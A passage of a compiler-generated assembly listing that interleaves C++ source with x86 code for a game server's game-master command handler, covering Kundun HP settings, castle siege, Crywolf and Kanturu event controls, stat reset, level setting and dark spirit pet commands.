  02739	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0273c	83 c0 73	 add	 eax, 115		; 00000073H
  0273f	50		 push	 eax
  02740	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02743	83 c1 68	 add	 ecx, 104		; 00000068H
  02746	51		 push	 ecx
  02747	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0274a	83 c2 18	 add	 edx, 24			; 00000018H
  0274d	52		 push	 edx
  0274e	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  02753	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  02759	83 c4 14	 add	 esp, 20			; 00000014H

; 3210 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3211 : 			
; 3212 : 			KUNDUN_GM_LOG.Output( "[KUNDUN] Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  0275c	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@ONJMFEJN@?D?o?$LF?PHP?H?$LI?$LK?$LJ?$LN?C?$LA?$KD?$LM?$LD?A?$KE@
  02761	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02764	83 c0 73	 add	 eax, 115		; 00000073H
  02767	50		 push	 eax
  02768	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0276b	83 c1 68	 add	 ecx, 104		; 00000068H
  0276e	51		 push	 ecx
  0276f	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  02772	83 c2 18	 add	 edx, 24			; 00000018H
  02775	52		 push	 edx
  02776	68 00 00 00 00	 push	 OFFSET ??_C@_0DF@GLPGGMOI@?$FLKUNDUN?$FN?5Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs@
  0277b	68 00 00 00 00	 push	 OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  02780	e8 00 00 00 00	 call	 ?Output@CLogToFile@@QAAXPADZZ ; CLogToFile::Output
  02785	83 c4 18	 add	 esp, 24			; 00000018H

; 3213 : 			lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "HP");
; 3214 : #endif
; 3215 : 			
; 3216 : 			int iKundunHPTime = GetTokenNumber();

  02788	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0278b	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02790	89 85 28 f6 ff
	ff		 mov	 DWORD PTR _iKundunHPTime$62[ebp], eax

; 3217 : 			
; 3218 : 			if( iKundunHPTime < 0 || iKundunHPTime > 60000 )	

  02796	83 bd 28 f6 ff
	ff 00		 cmp	 DWORD PTR _iKundunHPTime$62[ebp], 0
  0279d	7c 0c		 jl	 SHORT $LN224@Management
  0279f	81 bd 28 f6 ff
	ff 60 ea 00 00	 cmp	 DWORD PTR _iKundunHPTime$62[ebp], 60000 ; 0000ea60H
  027a9	7e 07		 jle	 SHORT $LN223@Management
$LN224@Management:

; 3219 : 				return 0;

  027ab	33 c0		 xor	 eax, eax
  027ad	e9 0c 15 00 00	 jmp	 $LN1@Management
$LN223@Management:

; 3220 : 
; 3221 : 			giKundunRefillHPTime = iKundunHPTime;

  027b2	8b 85 28 f6 ff
	ff		 mov	 eax, DWORD PTR _iKundunHPTime$62[ebp]
  027b8	a3 00 00 00 00	 mov	 DWORD PTR ?giKundunRefillHPTime@@3HA, eax ; giKundunRefillHPTime

; 3222 : 
; 3223 : 			TNotice _Notice;

  027bd	6a 00		 push	 0
  027bf	8d 8d 18 f5 ff
	ff		 lea	 ecx, DWORD PTR __Notice$61[ebp]
  027c5	e8 00 00 00 00	 call	 ??0TNotice@@QAE@E@Z	; TNotice::TNotice

; 3224 : 			_Notice.SendToUser( lpObj->m_Index, " HP  = %d  = %d  = %d", 

  027ca	a1 00 00 00 00	 mov	 eax, DWORD PTR ?giKundunRefillHPTime@@3HA ; giKundunRefillHPTime
  027cf	50		 push	 eax
  027d0	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?giKundunRefillHP@@3HA ; giKundunRefillHP
  027d6	51		 push	 ecx
  027d7	8b 15 00 00 00
	00		 mov	 edx, DWORD PTR ?giKundunRefillHPSec@@3HA ; giKundunRefillHPSec
  027dd	52		 push	 edx
  027de	68 00 00 00 00	 push	 OFFSET ??_C@_0DC@DLDEMFJO@?D?o?$LF?P?5HP?5?C?J?$LE?g?H?$LI?$LK?$LJ?$LH?$KO?5?$DN?5?$CFd?5?H?$LI?$LK?$LJ?$LH?$KO?5@
  027e3	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  027e6	8b 08		 mov	 ecx, DWORD PTR [eax]
  027e8	51		 push	 ecx
  027e9	8d 95 18 f5 ff
	ff		 lea	 edx, DWORD PTR __Notice$61[ebp]
  027ef	52		 push	 edx
  027f0	e8 00 00 00 00	 call	 ?SendToUser@TNotice@@QAAXHPADZZ ; TNotice::SendToUser
  027f5	83 c4 18	 add	 esp, 24			; 00000018H

; 3225 : 				giKundunRefillHPSec, giKundunRefillHP, giKundunRefillHPTime );
; 3226 : 		}
; 3227 : 		break;

  027f8	e9 bf 14 00 00	 jmp	 $LN2@Management
$LN225@Management:

; 3228 : #endif //## ADD_KUNDUN_CONTROL_20040923
; 3229 : 
; 3230 : 
; 3231 : #ifdef CASTLE_GM_COMMAND_20041222				//   
; 3232 : #ifdef CASTLE_MAIN_SCHEDULER_20041111
; 3233 : 	case GMCMD_CS_CHANGEOWNERGUILD :			// "/"
; 3234 : 		{
; 3235 : 			LPSTR lpszGuildName		= GetTokenString();
; 3236 : 			g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_CHANGEOWNERGUILD, lpszGuildName);
; 3237 : 		}
; 3238 : 		break;
; 3239 : 	case GMCMD_CS_SETSTATE_REGSIEGE :			// "/"
; 3240 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_REGSIEGE);
; 3241 : 		break;
; 3242 : 	case GMCMD_CS_SETSTATE_REGMARK :			// "/"
; 3243 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_REGMARK);
; 3244 : 		break;
; 3245 : 	case GMCMD_CS_SETSTATE_NOTIFY :				// "/"
; 3246 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_NOTIFY);
; 3247 : 		break;
; 3248 : 	case GMCMD_CS_SETSTATE_STARTSIEGE :			// "/"
; 3249 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_STARTSIEGE);
; 3250 : 		break;
; 3251 : 	case GMCMD_CS_SETSTATE_ENDSIEGE :			// "/"
; 3252 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_ENDSIEGE);
; 3253 : 		break;
; 3254 : 	case GMCMD_CS_SETSTATE_GETOWNERGUILD :		// ""
; 3255 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_GETOWNERGUILD);
; 3256 : 		break;
; 3257 : 	case GMCMD_CS_SETSTATE_GETCASTLESTATE :		// ""
; 3258 : 		g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_GETCASTLESTATE);
; 3259 : 		break;
; 3260 : 	case GMCMD_CS_CHANGECSSIDE :				// ""
; 3261 : 		{
; 3262 : 			LPSTR lpszGuildName		= GetTokenString();
; 3263 : 			g_CastleSiege.OperateGmCommand(lpObj->m_Index, CS_GMCMD_SETSTATE_CHANGECSSIDE, lpszGuildName);
; 3264 : 		}
; 3265 : 		break;
; 3266 : #endif
; 3267 : #endif
; 3268 : 
; 3269 : #ifdef CRYWOLF_GM_COMMAND_20050525	//  
; 3270 : 	case GMCMD_CRYWOLF_READY :		// ""
; 3271 : 		g_Crywolf.OperateGmCommand( lpObj->m_Index, CRYWOLF_GM_COMMAND_READY);
; 3272 : 		break;
; 3273 : 	case GMCMD_CRYWOLF_START :		// ""
; 3274 : 		g_Crywolf.OperateGmCommand( lpObj->m_Index, CRYWOLF_GM_COMMAND_START);
; 3275 : 		break;
; 3276 : 	case GMCMD_CRYWOLF_END	:		// ""
; 3277 : 		g_Crywolf.OperateGmCommand( lpObj->m_Index, CRYWOLF_GM_COMMAND_END);
; 3278 : 		break;
; 3279 : 	case GMCMD_CRYWOLF_NOTIFY_2 :
; 3280 : 		g_Crywolf.OperateGmCommand( lpObj->m_Index, CRYWOLF_GM_COMMAND_NOTIFY_2);
; 3281 : 		break;
; 3282 : #endif
; 3283 : 
; 3284 : #ifdef KANTURU_GM_COMMAND_20060709
; 3285 : 	case GMCMD_KANTURU_STANBY:			// "/"
; 3286 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_STANBY );
; 3287 : 		break;
; 3288 : 	case GMCMD_KANTURU_BATTLEOFMAYA:	// "/"
; 3289 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_BATTLEOFMAYA );
; 3290 : 		break;		
; 3291 : 	case GMCMD_KANTURU_MAYA_MONSTER1:	// "/1"
; 3292 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA_MONSTER1 );
; 3293 : 		break;
; 3294 : 	case GMCMD_KANTURU_MAYA1:			// "/1"
; 3295 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA1 );
; 3296 : 		break;
; 3297 : 	case GMCMD_KANTURU_MAYA_MONSTER2:	// "/2"
; 3298 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA_MONSTER2 );
; 3299 : 		break;		
; 3300 : 	case GMCMD_KANTURU_MAYA2:			// "/2"
; 3301 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA2 );
; 3302 : 		break;
; 3303 : 	case GMCMD_KANTURU_MAYA_MONSTER3:	// "/3"
; 3304 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA_MONSTER3 );
; 3305 : 		break;
; 3306 : 	case GMCMD_KANTURU_MAYA3:			// "/3"
; 3307 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA3 );
; 3308 : 		break;
; 3309 : 	case GMCMD_KANTURU_MAYA3_SUCCESS:	// "/3"
; 3310 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA3_SUCCESS );
; 3311 : 		break;
; 3312 : 	case GMCMD_KANTURU_MAYA_SUCCESS:	// "/"
; 3313 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA_SUCCESS );
; 3314 : 		break;	
; 3315 : 	case GMCMD_KANTURU_MAYA_FAIL:		// "/"
; 3316 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_MAYA_FAIL );
; 3317 : 		break;		
; 3318 : 	case GMCMD_KANTURU_BATTLEOFNIGHTMARE:			// "/"
; 3319 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_NIGHTMARE );
; 3320 : 		break;
; 3321 : 	case GMCMD_KANTURU_BATTLEOFNIGHTMARE_SUCCESS:	// "/"
; 3322 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_NIGHTMARE_SUCCESS );
; 3323 : 		break;
; 3324 : 	case GMCMD_KANTURU_BATTLEOFNIGHTMARE_FAIL:		// "/"
; 3325 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_NIGHTMARE_FAIL );
; 3326 : 		break;		
; 3327 : 	case GMCMD_KANTURU_TOWEROFREFINEMENT:			// "/"
; 3328 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_TOWEROFREFINEMENT );
; 3329 : 		break;
; 3330 : 	case GMCMD_KANTURU_TOWER_OPEN:					// "/"
; 3331 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_TOWER_OPEN );
; 3332 : 		break;
; 3333 : 	case GMCMD_KANTURU_TOWER_CLOSE:					// "/"
; 3334 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_TOWER_CLOSE );
; 3335 : 		break;
; 3336 : 	case GMCMD_KANTURU_END:							// "/"
; 3337 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_END );
; 3338 : 		break;
; 3339 : 	case GMCMD_KANTURU_NEXT_STATE:					// ""
; 3340 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_NEXT_STATE );
; 3341 : 		break;
; 3342 : 	case GMCMD_KANTURU_NEXT_DETAIL_STATE:			// ""
; 3343 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_NEXT_DETAIL_STATE );
; 3344 : 		break;
; 3345 : 	case GMCMD_KANTURU_CURRENT_STATE:				// ""
; 3346 : 		g_Kanturu.OperateGmCommand( lpObj->m_Index, KANTURU_GM_COMMAND_CURRENT_STATE );
; 3347 : 		break;
; 3348 : #endif	// #ifdef KANTURU_GM_COMMAND_20060709
; 3349 : 
; 3350 : 	case GMCMD_STATRESET :
; 3351 : 		{	//  
; 3352 : 			int Class = lpObj->Class;

  027fd	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02800	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  02807	89 8d 14 f5 ff
	ff		 mov	 DWORD PTR _Class$60[ebp], ecx

; 3353 : 
; 3354 : #ifdef NEW_SKILL_FORSKYLAND
; 3355 : 			lpObj->ChangeUP = 0;

  0280d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02810	c6 80 9f 00 00
	00 00		 mov	 BYTE PTR [eax+159], 0

; 3356 : #endif
; 3357 : 			//lpObj->Experience = 0;
; 3358 : 
; 3359 : 			lpObj->Strength = DCInfo.DefClass[Class].Strength;

  02817	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  02821	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02824	66 8b 90 08 00
	00 00		 mov	 dx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+8]
  0282b	66 89 91 b4 00
	00 00		 mov	 WORD PTR [ecx+180], dx

; 3360 : 			lpObj->Dexterity = DCInfo.DefClass[Class].Dexterity;

  02832	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  0283c	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0283f	66 8b 90 0a 00
	00 00		 mov	 dx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+10]
  02846	66 89 91 b6 00
	00 00		 mov	 WORD PTR [ecx+182], dx

; 3361 : 			lpObj->Vitality = DCInfo.DefClass[Class].Vitality;

  0284d	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  02857	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0285a	66 8b 90 0c 00
	00 00		 mov	 dx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+12]
  02861	66 89 91 b8 00
	00 00		 mov	 WORD PTR [ecx+184], dx

; 3362 : 			lpObj->Energy = DCInfo.DefClass[Class].Energy;

  02868	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  02872	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02875	66 8b 90 0e 00
	00 00		 mov	 dx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+14]
  0287c	66 89 91 ba 00
	00 00		 mov	 WORD PTR [ecx+186], dx

; 3363 : 			lpObj->Life = DCInfo.DefClass[Class].Life;

  02883	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  0288d	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02890	8b 90 14 00 00
	00		 mov	 edx, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+20]
  02896	89 91 bc 00 00
	00		 mov	 DWORD PTR [ecx+188], edx

; 3364 : 			lpObj->MaxLife = DCInfo.DefClass[Class].MaxLife;

  0289c	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  028a6	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  028a9	8b 90 18 00 00
	00		 mov	 edx, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+24]
  028af	89 91 c0 00 00
	00		 mov	 DWORD PTR [ecx+192], edx

; 3365 : 			
; 3366 : 			lpObj->Mana = DCInfo.DefClass[Class].Mana;

  028b5	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  028bf	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  028c2	8b 90 20 00 00
	00		 mov	 edx, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+32]
  028c8	89 91 d0 00 00
	00		 mov	 DWORD PTR [ecx+208], edx

; 3367 : 			lpObj->MaxMana = DCInfo.DefClass[Class].MaxMana;			

  028ce	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  028d8	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  028db	8b 90 24 00 00
	00		 mov	 edx, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+36]
  028e1	89 91 d4 00 00
	00		 mov	 DWORD PTR [ecx+212], edx

; 3368 : 
; 3369 : #ifdef DARKLORD_WORK
; 3370 : 			lpObj->Leadership = DCInfo.DefClass[Class].Leadership;

  028e7	69 85 14 f5 ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$60[ebp], 2400
  028f1	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  028f4	66 8b 90 60 09
	00 00		 mov	 dx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+2400]
  028fb	66 89 91 d8 00
	00 00		 mov	 WORD PTR [ecx+216], dx

; 3371 : #endif
; 3372 : 
; 3373 : #ifdef DARKLORD_WORK
; 3374 : 			if (lpObj->Class == CLASS_DARKLORD||lpObj->Class == CLASS_MAGUMSA) 

  02902	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02905	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0290c	83 f9 04	 cmp	 ecx, 4
  0290f	74 0f		 je	 SHORT $LN228@Management
  02911	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02914	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0291b	83 f9 03	 cmp	 ecx, 3
  0291e	75 1b		 jne	 SHORT $LN226@Management
$LN228@Management:

; 3375 : #else			
; 3376 : 			if( lpObj->Class == CLASS_MAGUMSA )
; 3377 : #endif
; 3378 : 				lpObj->LevelUpPoint = (lpObj->Level-1)*7;

  02920	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02923	0f bf 88 a0 00
	00 00		 movsx	 ecx, WORD PTR [eax+160]
  0292a	83 e9 01	 sub	 ecx, 1
  0292d	6b d1 07	 imul	 edx, ecx, 7
  02930	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02933	89 90 a4 00 00
	00		 mov	 DWORD PTR [eax+164], edx
  02939	eb 19		 jmp	 SHORT $LN227@Management
$LN226@Management:

; 3379 : 			else
; 3380 : 				lpObj->LevelUpPoint = (lpObj->Level-1)*5;

  0293b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0293e	0f bf 88 a0 00
	00 00		 movsx	 ecx, WORD PTR [eax+160]
  02945	83 e9 01	 sub	 ecx, 1
  02948	6b d1 05	 imul	 edx, ecx, 5
  0294b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0294e	89 90 a4 00 00
	00		 mov	 DWORD PTR [eax+164], edx
$LN227@Management:

; 3381 : 			
; 3382 : 
; 3383 : 			GCServerMsgStringSend("  .   ", lpObj->m_Index, 1);

  02954	6a 01		 push	 1
  02956	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02959	8b 08		 mov	 ecx, DWORD PTR [eax]
  0295b	51		 push	 ecx
  0295c	68 00 00 00 00	 push	 OFFSET ??_C@_0CP@INODGHGL@?D?$LD?$LI?$KP?E?M?5?A?$KE?$LK?$LI?$LA?$KB?5?$LI?$KO?$LM?B?$LF?G?$LO?z?$LN?$MA?$LE?O?$LE?Y?4?5?$LL@
  02961	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  02966	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3384 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  02969	6a 01		 push	 1
  0296b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0296e	8b 08		 mov	 ecx, DWORD PTR [eax]
  02970	51		 push	 ecx
  02971	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  02976	83 c4 08	 add	 esp, 8

; 3385 : 		}
; 3386 : 	break;

  02979	e9 3e 13 00 00	 jmp	 $LN2@Management
$LN229@Management:

; 3387 : 
; 3388 : 	case GMCMD_SETLEVEL:
; 3389 : 		{
; 3390 : 			int Class = lpObj->Class;

  0297e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02981	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  02988	89 8d 10 f5 ff
	ff		 mov	 DWORD PTR _Class$59[ebp], ecx

; 3391 : 
; 3392 : 			int level= GetTokenNumber();

  0298e	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02991	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02996	89 85 0c f5 ff
	ff		 mov	 DWORD PTR _level$58[ebp], eax

; 3393 : 
; 3394 : 			if( level < 1 )

  0299c	83 bd 0c f5 ff
	ff 01		 cmp	 DWORD PTR _level$58[ebp], 1
  029a3	7d 0a		 jge	 SHORT $LN230@Management

; 3395 : 				level = 1;

  029a5	c7 85 0c f5 ff
	ff 01 00 00 00	 mov	 DWORD PTR _level$58[ebp], 1
$LN230@Management:

; 3396 : 
; 3397 : 			lpObj->Level = level;

  029af	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  029b2	66 8b 8d 0c f5
	ff ff		 mov	 cx, WORD PTR _level$58[ebp]
  029b9	66 89 88 a0 00
	00 00		 mov	 WORD PTR [eax+160], cx

; 3398 : 
; 3399 : 			lpObj->Experience = gLevelExperience[lpObj->Level-1];

  029c0	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  029c3	0f bf 88 a0 00
	00 00		 movsx	 ecx, WORD PTR [eax+160]
  029ca	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  029cd	8b 04 8d fc ff
	ff ff		 mov	 eax, DWORD PTR ?gLevelExperience@@3PAKA[ecx*4-4]
  029d4	89 82 a8 00 00
	00		 mov	 DWORD PTR [edx+168], eax

; 3400 : 			
; 3401 : #ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 3402 : 			lpObj->iFruitPoint = 0;
; 3403 : #endif
; 3404 : 			//    
; 3405 : 			ManagementProc(lpObj, "/", aIndex);

  029da	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  029dd	50		 push	 eax
  029de	68 00 00 00 00	 push	 OFFSET ??_C@_09IHCLJBNP@?1?$LN?$LK?E?H?$LI?$KO?$LM?B@
  029e3	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  029e6	51		 push	 ecx
  029e7	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  029ea	e8 00 00 00 00	 call	 ?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z ; CGMMng::ManagementProc

; 3406 : 		}
; 3407 : 	break;

  029ef	e9 c8 12 00 00	 jmp	 $LN2@Management
$LN231@Management:

; 3408 : 
; 3409 : #ifdef DARKLORD_WORK
; 3410 : 	case GMCMD_DARKSPIRIT:
; 3411 : 		{			
; 3412 : 			int mode = GetTokenNumber();

  029f4	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  029f7	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  029fc	89 85 08 f5 ff
	ff		 mov	 DWORD PTR _mode$57[ebp], eax

; 3413 : 			
; 3414 : 			CDarkSpirit::ePetItem_Mode setmode = CDarkSpirit::PetItem_Mode_Normal;

  02a02	c7 85 04 f5 ff
	ff 00 00 00 00	 mov	 DWORD PTR _setmode$56[ebp], 0

; 3415 : 
; 3416 : 			if( mode == CDarkSpirit::PetItem_Mode_Normal )			

  02a0c	83 bd 08 f5 ff
	ff 00		 cmp	 DWORD PTR _mode$57[ebp], 0
  02a13	75 0c		 jne	 SHORT $LN232@Management

; 3417 : 				setmode = CDarkSpirit::PetItem_Mode_Normal;

  02a15	c7 85 04 f5 ff
	ff 00 00 00 00	 mov	 DWORD PTR _setmode$56[ebp], 0
  02a1f	eb 3d		 jmp	 SHORT $LN238@Management
$LN232@Management:

; 3418 : 			else if( mode == CDarkSpirit::PetItem_Mode_Attack_Random )

  02a21	83 bd 08 f5 ff
	ff 01		 cmp	 DWORD PTR _mode$57[ebp], 1
  02a28	75 0c		 jne	 SHORT $LN234@Management

; 3419 : 				setmode = CDarkSpirit::PetItem_Mode_Attack_Random;

  02a2a	c7 85 04 f5 ff
	ff 01 00 00 00	 mov	 DWORD PTR _setmode$56[ebp], 1
  02a34	eb 28		 jmp	 SHORT $LN238@Management
$LN234@Management:

; 3420 : 			else if( mode == CDarkSpirit::PetItem_Mode_Attack_WithMaster )

  02a36	83 bd 08 f5 ff
	ff 02		 cmp	 DWORD PTR _mode$57[ebp], 2
  02a3d	75 0c		 jne	 SHORT $LN236@Management

; 3421 : 				setmode = CDarkSpirit::PetItem_Mode_Attack_WithMaster;

  02a3f	c7 85 04 f5 ff
	ff 02 00 00 00	 mov	 DWORD PTR _setmode$56[ebp], 2
  02a49	eb 13		 jmp	 SHORT $LN238@Management
$LN236@Management:

; 3422 : 			else if( mode == CDarkSpirit::PetItem_Mode_Attack_Target )

  02a4b	83 bd 08 f5 ff
	ff 03		 cmp	 DWORD PTR _mode$57[ebp], 3
  02a52	75 0a		 jne	 SHORT $LN238@Management

; 3423 : 				setmode = CDarkSpirit::PetItem_Mode_Attack_Target;

  02a54	c7 85 04 f5 ff
	ff 03 00 00 00	 mov	 DWORD PTR _setmode$56[ebp], 3
$LN238@Management:

; 3424 : 
; 3425 : 			gDarkSpirit[lpObj->m_Index].SetMode(setmode);

  02a5e	6a ff		 push	 -1
  02a60	8b 85 04 f5 ff
	ff		 mov	 eax, DWORD PTR _setmode$56[ebp]
  02a66	50		 push	 eax
  02a67	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02a6a	6b 09 28	 imul	 ecx, DWORD PTR [ecx], 40
  02a6d	81 c1 00 00 00
	00		 add	 ecx, OFFSET ?gDarkSpirit@@3PAVCDarkSpirit@@A ; gDarkSpirit
  02a73	e8 00 00 00 00	 call	 ?SetMode@CDarkSpirit@@QAEXW4ePetItem_Mode@1@H@Z ; CDarkSpirit::SetMode

; 3426 : 		}
; 3427 : 	break;

  02a78	e9 3f 12 00 00	 jmp	 $LN2@Management
$LN239@Management:

; 3428 : 
; 3429 : 	case GMCMD_DARKSPIRIT_LEVEL:
; 3430 : 		{
; 3431 : 			int nPos = GetTokenNumber();

  02a7d	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02a80	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02a85	89 85 00 f5 ff
	ff		 mov	 DWORD PTR _nPos$55[ebp], eax

; 3432 : 			int nLevel = GetTokenNumber();

  02a8b	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02a8e	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02a93	89 85 fc f4 ff
	ff		 mov	 DWORD PTR _nLevel$54[ebp], eax

; 3433 : 
; 3434 : 			lpObj->pInventory[nPos].m_PetItem_Level = nLevel;

  02a99	69 85 00 f5 ff
	ff a8 00 00 00	 imul	 eax, DWORD PTR _nPos$55[ebp], 168
  02aa3	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02aa6	8b 91 5c 0c 00
	00		 mov	 edx, DWORD PTR [ecx+3164]
  02aac	8b 8d fc f4 ff
	ff		 mov	 ecx, DWORD PTR _nLevel$54[ebp]
  02ab2	89 8c 02 a0 00
	00 00		 mov	 DWORD PTR [edx+eax+160], ecx

; 3435 : 
; 3436 : #ifdef ADD_380ITEM_NEWOPTION_20060711
; 3437 : 			lpObj->pInventory[nPos].Convert(lpObj->pInventory[nPos].m_Type, 
